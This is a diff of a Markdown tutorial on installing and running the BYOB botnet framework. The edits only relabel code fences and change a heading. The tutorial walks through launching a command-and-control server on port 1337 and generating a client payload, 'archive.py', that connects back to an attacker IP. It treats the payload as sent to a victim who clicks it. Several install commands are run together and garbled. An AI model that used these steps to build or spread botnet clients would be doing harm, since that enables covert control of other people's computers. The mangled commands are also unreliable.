@@ -47,13 +47,13 @@ For Arch Linux users you will need to install first the following dependencies:
 
 **Install BYOB on Ubuntu/Debian and other derived distributions**
 
-```bash
+```html
 git clone https://github.com/malwaredllc/byobcd byob/byob/chmod +x setup.pypip install -r requirements.txtsudo python setup.py
 ```
 
 **Install BYOB on Arch Linux**
 
-```bash
+```html
 sudo pacman -Syu base-devel hdf5 opencv opencv-samplesgit clone https://github.com/malwaredllc/byobcd byob/byob/chmod +x setup.pypip install -r requirements.txt
 ```
 
@@ -61,7 +61,7 @@ sudo pacman -Syu base-devel hdf5 opencv opencv-samplesgit clone https://github.c
 
 Once you are done with the installation, you can start your BYOB Botnet server. Honestly, I would like to make a long story but must say the truth, that can be done very easily. The unique thing you have to do is to execute the below command in your terminal:
 
-```bash
+```html
 python server.py --port 1337
 ```
 
@@ -73,25 +73,25 @@ If you want to display usage information and/or all the options available, at th
 
 We will now talk about the most important part, we will create our first Botnet client that will target Linux machine. We will see in the next step how to create a client that works on Windows also don't worry. To do this the first thing that we will need to determine is the IP address to which your Botnet Server is currently connected. If you do not know the IP address of your machine, you can simply find it using the following command:
 
-```bash
+```html
 ifconfig
 ```
 
 Before moving further, we will take a few minutes to check the usage information and all the options available for our Botnet client. To do it, simply use the following command:
 
-```bash
+```html
 python client.py --help
 ```
 
 To create our Botnet we must use the following arguments:
 
-```bash
+```html
 usage: client.py [-h] [--name NAME] [--encrypt] [Botnet Server IP] [Botnet Server Port]
 ```
 
 So let's try to generate our first Botnet. For this tutorial, I will use it as output name `archive` but of course you can name it whatever you want.
 
-```bash
+```html
 python client.py --name archive.py 192.168.1.4 1337
 ```
 
@@ -99,7 +99,7 @@ A file named `archive.py` has been generated. I will not explain to you how to s
 
 * * *
 
-## What Botnet Allows Me To Do?
+### What Botnet Allows Me To Do?
 
 For the last part of this article, we will consider that our Botnet has been sent to our victim and that the latter had the very bad idea of clicking on it. The question you are probably asking yourself now is "What does BYOB allow me to do"? Frankly, the possibilities are quite wide since this source code allows you once to run a computer to run different modules which are:
 
